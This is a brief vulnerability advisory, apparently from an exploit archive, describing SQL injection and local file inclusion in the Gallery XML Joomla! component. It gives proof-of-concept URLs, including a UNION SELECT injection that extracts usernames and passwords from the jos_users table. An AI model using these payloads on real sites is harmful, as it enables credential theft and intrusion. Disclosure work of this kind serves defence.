@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/40964/info
+
+The Gallery XML Joomla! component is prone to an SQL-injection vulnerability and a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker can exploit these vulnerabilities to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database; by using directory-traversal strings to execute local script code in the context of the application, the attacker may be able to obtain sensitive information that may aid in further attacks.
+
+
+http://www.example.com/index.php?option=com_galleryxml&controller=[LFI]&task=catpics&gcatid=1
+http://www.example.com/index.php?option=com_galleryxml&controller=galpic&task=catpics&gcatid=-1 union select 1,2,3,4,5,6,concat(username,char(32),password),8,9,10,11,12 from jos_users -- '
+
